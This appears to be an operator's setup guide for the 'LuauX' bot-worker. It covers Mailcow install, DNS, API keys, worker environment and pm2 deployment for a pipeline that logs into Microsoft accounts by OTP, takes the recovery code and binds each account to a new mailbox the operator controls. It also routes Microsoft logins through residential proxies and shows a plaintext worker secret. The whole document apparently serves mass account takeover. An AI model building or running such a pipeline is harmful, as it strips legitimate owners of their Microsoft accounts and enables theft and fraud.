# LuauX recovery mailboxes (Mailcow)

Each secured Microsoft account gets its **own unique mailbox** on your domain.

```
Verify → OTP login → recovery code → create mailbox → MS sends code → IMAP read → secure done
```

Priority:

1. **Mailcow** (preferred) — real mailbox per job  
2. **Firstmail** — only if key is valid  
3. **Catch-all** — unique address, one shared IMAP inbox  

---

## 1. Requirements

| Need | Why |
|------|-----|
| VPS with public IP | Mail server (can be same Windows box or a Linux mail VPS) |
| Domain you control | e.g. `mail.example.com` / `example.com` |
| Ports open | **25** (SMTP in), **993** (IMAP), **443** (API/UI) |
| DNS access | MX / A / SPF / DKIM / DMARC |

**Note:** Many cheap VPS providers block port **25**. Mailcow needs inbound 25 or Microsoft mail will not arrive.

Mailcow is officially supported on **Linux** (Debian/Ubuntu). Running it on Windows is not recommended — use a small Linux VPS for mail if the bot-worker is on Windows.

---

## 2. Install Mailcow (Linux)

```bash
# Debian/Ubuntu recommended
cd /opt
git clone https://github.com/mailcow/mailcow-dockerized
cd mailcow-dockerized
./generate_config.sh
# set MAILCOW_HOSTNAME=mail.yourdomain.com
docker compose pull
docker compose up -d
```

Open UI:

```
https://mail.yourdomain.com
```

Default login is set during `generate_config.sh` (check the script output / docs).

---

## 3. DNS (critical)

Replace `yourdomain.com` and `MAIL_SERVER_IP` with yours.

### A record

```
mail.yourdomain.com.   A   MAIL_SERVER_IP
```

### MX (domain that receives recovery mail)

```
yourdomain.com.   MX 10   mail.yourdomain.com.
```

If recovery addresses are `@mail.yourdomain.com`, set MX on that zone/subdomain accordingly.

### SPF (TXT on the mail domain)

```
v=spf1 mx a ip4:MAIL_SERVER_IP -all
```

### DKIM

Mailcow UI → **Configuration → Configuration & Details → Configuration → ARC/DKIM keys**  
Add domain → copy the TXT record Mailcow shows.

### DMARC (TXT)

```
_dmarc.yourdomain.com.  TXT  "v=DMARC1; p=none; rua=mailto:admin@yourdomain.com"
```

### PTR (reverse DNS)

At your VPS host, set PTR for `MAIL_SERVER_IP` → `mail.yourdomain.com`.

Wait for DNS to propagate (`dig MX yourdomain.com`, `dig TXT yourdomain.com`).

---

## 4. Add domain in Mailcow

1. Mailcow UI → **Configuration → Mail Setup → Domains**  
2. **Add domain** → `yourdomain.com`  
3. Save  

Create one test mailbox manually to confirm IMAP works:

- e.g. `test@yourdomain.com`  
- Login with Thunderbird / Outlook / any IMAP client  
- Host: `mail.yourdomain.com`, port **993**, SSL/TLS  

---

## 5. Create API key

1. Mailcow UI → **System → Configuration → Access** (or **API**)  
2. Enable API  
3. Create **read-write** API key  
4. Restrict to your bot-worker IP if possible  

API base URL is usually:

```
https://mail.yourdomain.com
```

Create-mailbox endpoint used by the worker:

```
POST /api/v1/add/mailbox
Header: X-API-Key: YOUR_KEY
```

---

## 6. Worker env (`bot-worker/.env`)

```env
SITE_URL=https://luaux.wtf
WORKER_SECRET=larpingistiuff
WORKER_ID=worker-1

# --- Mailcow (unique mailbox per secure job) ---
MAILCOW_API_URL=https://mail.yourdomain.com
MAILCOW_API_KEY=paste-your-api-key-here
MAILCOW_DOMAIN=yourdomain.com

# Optional (defaults: host from MAILCOW_API_URL, port 993)
# MAILCOW_IMAP_HOST=mail.yourdomain.com
# MAILCOW_IMAP_PORT=993
# MAILCOW_QUOTA_MB=64

# If self-signed cert breaks IMAP:
# MAIL_TLS_INSECURE=1
```

Restart worker after editing `.env`.

---

## 7. Deploy bot-worker (Windows VPS)

```powershell
cd C:\luaux
pm2 kill
git fetch origin
git reset --hard origin/main
cd bot-worker
npm install
npm run build
pip install httpx
pm2 start node --name "bot-worker" -- dist/index.js
pm2 save
pm2 list
```

Must show **exactly one** `bot-worker`.

---

## 8. Test Mailcow API manually

```powershell
curl -X POST "https://mail.yourdomain.com/api/v1/add/mailbox" `
  -H "X-API-Key: YOUR_KEY" `
  -H "Content-Type: application/json" `
  -d "{\"local_part\":\"rtest123\",\"domain\":\"yourdomain.com\",\"name\":\"rtest123\",\"quota\":\"64\",\"password\":\"TestPass9!\",\"password2\":\"TestPass9!\",\"active\":\"1\",\"force_pw_update\":\"0\",\"tls_enforce_in\":\"0\",\"tls_enforce_out\":\"0\"}"
```

Success ≈ JSON with `"type":"success"`.  
Then IMAP login as `rtest123@yourdomain.com` with that password.

---

## 9. What success looks like in logs

```text
[secure] sticky proxy set ...
[secure] OTP login ok ...
[secure] apiCanary ok ...
[secure] Sec info ok ... netId=yes canary=yes
[secure] Got recovery code
[secure] Creating unique recovery mailbox (mailcow=true firstmail=... catchall=...)
[secure] Mailbox ready provider=mailcow email=rxxxx@yourdomain.com imap=mail.yourdomain.com
[secure] Running recovery flow (waiting for mailbox OTP)...
[secure] Account secured successfully! recoveryMailbox=rxxxx@yourdomain.com ...
```

If you see `mailcow=false`, env vars are missing/empty on the worker.

---

## 10. Troubleshooting

| Symptom | Fix |
|---------|-----|
| `mailcow=false` | Set `MAILCOW_API_URL`, `MAILCOW_API_KEY`, `MAILCOW_DOMAIN` and restart pm2 |
| `Mailcow add/mailbox failed` | API key permissions, domain exists in Mailcow, HTTPS cert OK |
| `Timeout waiting for security code via IMAP` | MX/DNS wrong, port 25 blocked, domain reputation, IMAP host/port wrong |
| IMAP TLS error | Set `MAIL_TLS_INSECURE=1` temporarily |
| MS never sends code | Domain too new / no SPF-DKIM / IP blacklisted — warm domain, check mail logs in Mailcow |
| Dual workers / races | `pm2 kill` then start **one** process only |
| Firstmail still used | Mailcow not configured; Firstmail key currently returns `Token is not valid` |

Mailcow logs:

```bash
cd /opt/mailcow-dockerized
docker compose logs --tail=200 postfix-mailcow
docker compose logs --tail=200 dovecot-mailcow
```

---

## 11. Optional: catch-all fallback (not separate mailboxes)

If you cannot run Mailcow yet:

```env
RECOVERY_MAIL_DOMAIN=mail.yourdomain.com
RECOVERY_IMAP_HOST=mail.yourdomain.com
RECOVERY_IMAP_USER=inbox@yourdomain.com
RECOVERY_IMAP_PASS=...
RECOVERY_IMAP_PORT=993
```

Worker invents `rxxxxx@mail.yourdomain.com`; all mail must land in `inbox@...`.  
This is **not** a real separate mailbox per account — only looks unique.

---

## 12. Security notes

- Treat `MAILCOW_API_KEY` like a root password  
- Prefer API allowlist to bot-worker IP  
- Private GitHub is still not a secrets vault — rotate if the repo is ever shared  
- Recovery mailbox password is logged on success for ops; strip from logs later if needed  

---

## 13. Checklist

- [ ] Linux VPS, port 25 open  
- [ ] Mailcow installed, UI works  
- [ ] Domain + MX + SPF + DKIM + DMARC  
- [ ] Domain added in Mailcow  
- [ ] Manual test mailbox + IMAP works  
- [ ] API key created (read-write)  
- [ ] `bot-worker/.env` has `MAILCOW_*`  
- [ ] One pm2 `bot-worker`  
- [ ] Secure job log shows `provider=mailcow` and `Account secured successfully`  

---

## Related files

| File | Role |
|------|------|
| `bot-worker/src/recovery-mailbox.ts` | Create Mailcow mailbox + IMAP code read |
| `bot-worker/src/secure.ts` | Secure pipeline (calls mailbox helpers) |
| `bot-worker/.env.example` | Env template |
| `bot-worker/proxies.txt` | Residential proxies for MS login |

Production site: `https://luaux.wtf`  
Worker polls site with `WORKER_SECRET` (must match Vercel).
